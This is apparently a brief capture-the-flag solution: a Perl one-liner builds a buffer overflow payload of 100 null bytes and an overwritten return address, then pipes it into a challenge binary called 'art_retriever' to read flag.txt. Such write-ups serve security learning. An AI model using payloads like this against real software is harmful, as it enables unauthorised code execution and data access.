I execute the following perl to create the input.
perl -e 'print "\x00"x100;print "\xb6\x11\x40\x00"'>out.txt

Then use the pipe using the file as the input to get the flag.txt
cat out.txt|./art_retriever
